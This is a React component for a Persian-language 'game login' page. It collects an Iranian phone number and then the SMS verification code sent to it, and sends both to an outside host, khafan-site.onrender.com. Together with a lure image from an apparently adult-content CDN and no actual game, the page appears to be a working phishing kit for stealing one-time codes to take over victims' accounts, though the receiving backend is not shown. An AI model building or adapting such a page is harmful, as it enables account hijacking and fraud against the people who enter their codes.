import { useState } from "react";
import "./App.css";

export default function Register() {
  const [step, setStep] = useState(1);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [userId, setUserId] = useState("");

  const handlePhone = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
    setPhone(value);
  };

  const sendPhone = async () => {
    if (!/^09\d{9}$/.test(phone)) {
      alert("شماره معتبر نیست");
      return;
    }

    const res = await fetch("https://khafan-site.onrender.com/phone", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone }),
    });

    const data = await res.json();
    setUserId(data.id);

    alert("کد از طریق SMS برای شما ارسال شد لطفا کد را وارد کنید");
    setStep(2);
  };

  const sendCode = async () => {
    if (!code) return alert("کد را وارد کنید");

    await fetch(`https://khafan-site.onrender.com/code/${userId}`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code }),
    });

    alert("ورود موفقیت آمیز بود");
  };

  return (
    <div className="page">
      <div className="bg"></div>

      <div className="card">
        {step === 1 && (
          <>
            <img
              className="img"
              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
            />

            <h2>ورود به بازی</h2>

            <input
              value={phone}
              onChange={handlePhone}
              placeholder="09xxxxxxxxx"
            />

            <button onClick={sendPhone}>ثبت نام</button>
          </>
        )}

        {step === 2 && (
          <>
            <img
              className="img"
              src="https://fi1-ph.ypncdn.com/videos/202505/02/468061265/original/(m=eaSaaTbWx)(mh=ZYcC24OaVFTpvG-v)3.jpg"
            />

            <h2>کد را وارد کنید</h2>

            <input
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="کد تایید"
            />

            <button onClick={sendCode}>تایید</button>
          </>
        )}
      </div>
    </div>
  );
}